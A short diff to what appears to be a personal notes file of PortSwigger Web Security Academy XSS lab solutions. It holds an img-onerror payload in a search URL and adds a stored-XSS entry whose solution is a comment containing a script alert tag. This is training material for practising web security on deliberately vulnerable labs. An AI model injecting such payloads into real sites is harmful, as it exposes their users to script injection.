@@ -37,3 +37,8 @@ solution: https://ac251f101e03062d80f81c48003000e2.web-security-academy.net/prod
 url: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink
 solution: https://aca61f131f35b7d780f25af80025008f.web-security-academy.net/?search=<img src=18 onerror=alert(18)>
 
+[lab: Stored XSS into HTML context with nothing encoded]
+url: https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded
+solution: 
+   step-1: make a comment with a similar html tag as <script>alert(18);</script>
+
